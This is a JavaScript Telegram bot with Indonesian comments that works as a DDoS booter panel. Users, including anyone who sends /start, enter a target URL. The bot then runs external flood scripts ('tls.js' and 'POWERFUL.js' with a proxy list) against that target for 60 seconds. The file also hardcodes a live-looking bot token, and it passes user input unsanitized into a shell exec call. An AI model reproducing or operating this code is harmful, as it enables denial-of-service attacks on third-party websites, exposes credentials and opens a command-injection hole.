const TeleBot = require('telebot');
const { exec } = require('child_process');
const sqlite3 = require('sqlite3').verbose();

const bot = new TeleBot('6388514873:AAFkOzS34BRXKJAs7T2RT0tfVjwwJAvlIb0');

// Membuat atau membuka database SQLite
const db = new sqlite3.Database('vvip_users.db');

// Mengeksekusi perintah SQL untuk membuat tabel jika belum ada
db.run('CREATE TABLE IF NOT EXISTS vvip_users (user_id INTEGER PRIMARY KEY)');

// Menangani perintah /addvip
bot.on('/addvip', (msg) => {
  // Verifikasi kredensial pengguna
  if (msg.from.id === 5564352790) {
    // Menambahkan pengguna ke database
    db.run('INSERT INTO vvip_users (user_id) VALUES (?)', [msg.from.id], (error) => {
      if (error) {
        console.error('Error:', error.message);
        return bot.reply.text(msg.chat.id, 'Terjadi kesalahan saat menambahkan pengguna VVIP.');
      }
      return bot.reply.text(msg.chat.id, 'Pengguna berhasil ditambahkan sebagai VVIP.');
    });
  } else {
    return bot.reply.text(msg.chat.id, 'Anda tidak memiliki izin untuk menambahkan pengguna VVIP.');
  }
});

// Menangani perintah /tls
bot.on('/tls', (msg) => {
  // Verifikasi pengguna VVIP
  db.get('SELECT user_id FROM vvip_users WHERE user_id = ?', [msg.from.id], (error, row) => {
    if (error) {
      console.error('Error:', error.message);
      return bot.reply.text(msg.chat.id, 'Terjadi kesalahan saat memverifikasi pengguna VVIP.');
    }
    if (row) {
      if (!is_tls_running) {
        return bot.sendMessage(msg.chat.id, 'Masukkan target:').then((response) => {
          bot.once('text', (msg) => {
            performTls(msg.text, msg.chat.id);
          });
        });
      } else {
        return bot.reply.text(msg.chat.id, 'Serangan tls sedang berjalan.');
      }
    } else {
      return bot.reply.text(msg.chat.id, 'Anda tidak memiliki izin untuk menggunakan fitur ini.');
    }
  });
});

// Menjalankan serangan tls
function performTls(url, chatId) {
  is_tls_running = true;
  bot.sendMessage(chatId, 'Serangan dimulai');
  bot.sendMessage(chatId, 'Serangan Akan Di Hentikan Ketika Sudah 60 Detik!!');
  exec(`node tls.js {url} 60`, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error: ${error.message}`);
      return;
    }
    console.log(`stdout: ${stdout}`);
    console.error(`stderr: ${stderr}`);
    is_tls_running = false;
    bot.sendMessage(chatId, 'Serangan tls telah dihentikan.');
  });

  // Menghentikan serangan setelah 60 detik
  tls_timeout = setTimeout(() => {
    if (is_tls_running) {
      is_tls_running = false;
      bot.sendMessage(chatId, 'Serangan tls telah dihentikan setelah 60 detik.');
    }
  }, 60000);
}

// Menangani perintah /freeflood
bot.on('/freeflood', (msg) => {
  if (!is_freeflood_running) {
    return bot.sendMessage(msg.chat.id, 'Masukkan target:').then((response) => {
      bot.once('text', (msg) => {
        performFreeflood(msg.text, msg.chat.id);
      });
    });
  } else {
    return bot.reply.text(msg.chat.id, 'Serangan freeflood sedang berjalan.');
  }
});

// Menjalankan serangan freeflood
function performFreeflood(url, chatId) {
  is_freeflood_running = true;
  bot.sendMessage(chatId, 'Serangan freeflood dimulai');
  exec(`node POWERFUL.js ${url} 20 15500 proxy.txt`, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error: ${error.message}`);
      return;
    }
    console.log(`stdout: ${stdout}`);
    console.error(`stderr: ${stderr}`);
    is_freeflood_running = false;
    bot.sendMessage(chatId, 'Serangan freeflood telah dihentikan.');
  });

  // Menghentikan serangan setelah 60 detik
  freeflood_timeout = setTimeout(() => {
    if (is_freeflood_running) {
      is_freeflood_running = false;
      bot.sendMessage(chatId, 'Serangan freeflood telah dihentikan setelah 60 detik.');
    }
  }, 60000);
}

// Menangani pesan teks dari pengguna
bot.on('text', (msg) => {
  if (msg.text === '/start') {
    // Menambahkan pengguna baru ke database
    db.run('INSERT INTO vvip_users (user_id) VALUES (?)', [msg.from.id], (error) => {
      if (error) {
        console.error('Error:', error.message);
        return bot.reply.text(msg.chat.id, 'Terjadi kesalahan saat menambahkan pengguna VVIP.');
      }
      return bot.reply.text(msg.chat.id, 'Anda telah ditambahkan sebagai pengguna VVIP.');
    });
  } else {
    // Verifikasi pengguna VVIP
    db.get('SELECT user_id FROM vvip_users WHERE user_id = ?', [msg.from.id], (error, row) => {
      if (error) {
        console.error('Error:', error.message);
        return bot.reply.text(msg.chat.id, 'Terjadi kesalahan saat memverifikasi pengguna VVIP.');
      }
      if (row) {
        return bot.reply.text(msg.chat.id, 'Halo, pengguna VVIP!');
      } else {
        return bot.reply.text(msg.chat.id, 'Halo, pengguna biasa.');
      }
    });
  }
});

// Menjalankan bot
bot.start();
require("http").createServer((_, res) => res.end("Uptime!")).listen(8080)